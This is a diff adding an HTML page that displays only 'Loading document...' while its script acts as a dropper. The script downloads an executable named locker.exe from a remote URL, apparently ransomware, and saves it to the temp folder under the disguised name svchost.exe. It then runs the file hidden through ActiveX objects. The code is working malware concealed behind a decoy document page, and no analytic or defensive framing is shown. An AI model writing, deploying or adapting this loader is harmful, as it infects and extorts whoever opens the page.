@@ -1,0 +1,34 @@
+<html>
+<body>
+<script>
+// First, download and execute the locker
+var url = "https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.exe";
+var xhr = new XMLHttpRequest();
+xhr.open("GET", url, false);
+xhr.overrideMimeType("text/plain; charset=x-user-defined");
+xhr.send(null);
+
+var data = "";
+for (var i = 0; i < xhr.responseText.length; i++) {
+    data += String.fromCharCode(xhr.responseText.charCodeAt(i) & 0xff);
+}
+
+// Decode and save as .exe
+var shell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var temp = shell.ExpandEnvironmentStrings("%TEMP%") + "\\svchost.exe";
+
+// Write binary data
+var stream = new ActiveXObject("ADODB.Stream");
+stream.Type = 1; // binary
+stream.Open();
+stream.Write(data);
+stream.SaveToFile(temp, 2);
+stream.Close();
+
+// Execute
+shell.Run('"' + temp + '"', 0, false);
+</script>
+Loading document...
+</body>
+</html>
